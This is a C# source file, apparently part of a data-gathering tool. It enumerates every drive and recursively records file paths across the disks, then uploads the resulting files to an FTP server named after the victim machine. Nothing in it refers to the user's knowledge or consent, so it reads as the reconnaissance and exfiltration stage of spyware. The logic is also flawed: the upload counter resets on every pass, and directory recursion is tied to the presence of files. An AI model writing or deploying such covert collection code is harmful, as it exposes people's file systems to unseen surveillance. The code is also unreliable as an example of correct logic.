using Network;
using System;
using System.Collections.Generic;
using System.IO;

namespace Gathering_information
{
    class Drive
    {
        private List<string> driveFilePath = new List<string>();
        private string Path = Environment.CurrentDirectory + "\\";

        public List<string> DriveFilePath { get => driveFilePath; set => driveFilePath = value; }

        public Drive() { }

        /// <summary>
        /// listes les  disques disponibles
        /// </summary>
        private void Listing_Disk_Disponible()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            string DiskName = "Infos_Disque" + ".dat", InfosFile = "Infos_Files" + ".dat", infosdisque;
            int cpt = 0;

            driveFilePath.Add(Path + DiskName);
            driveFilePath.Add(Path + InfosFile);
            driveFilePath.Add(Path + "Infos_Disque" + "_Old.dat");
            driveFilePath.Add(Path + "Infos_Files" + "_Old.dat");

            if (File.Exists(Path + DiskName))
            {
                File.Delete(Path + "Infos_Disque" + "_Old.dat");
                File.Move(Path + DiskName, Path + "Infos_Disque" + "_Old.dat");
            }
            if (File.Exists(Path + InfosFile))
            {
                File.Delete(Path + "Infos_Files" + "_Old.dat");
                File.Move(Path + InfosFile, Path + "Infos_Files" + "_Old.dat");
            }

            foreach (DriveInfo d in allDrives)
            {
                infosdisque = d.Name + ";" + d.DriveType + ";";

                StreamWriter swDisk = new StreamWriter(Path + DiskName, true);

                if (d.IsReady)
                {
                    infosdisque += d.VolumeLabel + ";" + d.DriveFormat + ";" + d.AvailableFreeSpace + ";" + d.TotalFreeSpace + ";" + d.TotalSize + ";";

                    StreamWriter swFiles = new StreamWriter(Path + InfosFile, true);
                    Listing_All_File_Drive(d.Name, swFiles);
                    swFiles.Close();
                    swFiles.Dispose();
                }
                cpt++;
                swDisk.WriteLine(infosdisque);
                swDisk.Close();
                swDisk.Dispose();
            }
        }
        private void Listing_All_File_Drive(string Path, StreamWriter sw)
        {
            foreach (string d in Directory.GetDirectories(Path))
            {
                if (d != "C:\\Windows")
                {
                    try
                    {
                        foreach (string f in Directory.GetFiles(d))
                        {
                            sw.WriteLine(f);
                            Listing_All_File_Drive(d, sw);
                        }
                    }
                    catch { }
                }
            }
        }
        private void SharingInfosDisk()
        {
            foreach (string s in DriveFilePath)
            {
                int cpt = 0;
                string machine;
                if (File.Exists(s))
                {
                    if (cpt == 0) machine = Environment.MachineName + "_machine_infos1";
                    else machine = Environment.MachineName + "_machine_infos2";
                    Ftp ftpclient = new Ftp();
                    ftpclient.Upload(s, machine);
                    cpt++;
                }
            }
        }

        
        //Public Method
        public void WritingInfos() { Listing_Disk_Disponible(); }
        public void SharingInfosDrive() { SharingInfosDisk(); }
    }
}
